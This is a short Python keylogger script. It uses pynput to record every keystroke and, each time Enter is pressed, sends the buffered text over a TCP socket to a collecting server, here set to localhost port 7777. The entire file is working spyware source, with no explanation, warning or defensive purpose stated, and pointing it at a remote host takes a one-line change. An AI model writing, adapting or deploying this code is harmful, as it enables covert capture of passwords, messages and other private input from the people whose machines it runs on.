import socket
from pynput.keyboard import Key,Listener

#Create Socket
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

#Connect to Server
server_address = ('localhost', 7777)
client_socket.connect(server_address)

# Logged key strokes will be added to logstring one by one.
# A loop will reinitialise logstring as "\n" after every send.
string = "\n"

#Keylogg

def on_press(key):
    global string
    if key != Key.enter:
        if (str(key)).__contains__("Key."):
            if key == Key.space:
                string = string + " "
            else:
                if len(string) > 1: 
                    string = string + str(key).strip("'")
                else:
                    string = string + str(key).strip("'")
                    
        else: 
            string = string + str(key).strip("'")
    else:
        client_socket.sendall((string).encode('utf-8'))
        string = "\n"

with Listener(on_press=on_press) as listener :
    listener.join() 

